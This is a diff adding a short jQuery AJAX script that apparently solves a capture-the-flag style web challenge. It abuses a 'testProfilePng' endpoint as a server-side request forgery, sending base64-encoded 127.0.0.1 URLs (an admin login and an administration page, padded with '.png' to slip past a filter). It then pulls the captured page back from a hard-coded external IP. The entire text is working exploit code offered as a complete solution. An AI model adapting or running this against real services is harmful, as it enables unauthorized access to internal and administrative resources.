@@ -1,0 +1,24 @@
+this ajax script does everything altogether:
+$.ajax({
+    url: "testProfilePng",
+    data: {
+        u: btoa('http://127.0.0.1/login.php?user_name=admin&password=.png')
+    },
+    success: function(e) {
+        if (e.err != 'File not Found!'){
+            console.log(e);
+			$.ajax({
+				url: "testProfilePng",
+				data: {
+					u: btoa('http://127.0.0.1/administration?=test.png')
+				},
+				success: function() {
+						$.get('http://35.205.32.11/profilePics/administration', function(data){
+							console.log(data);
+						});
+				}
+
+			});
+        }
+    }
+});
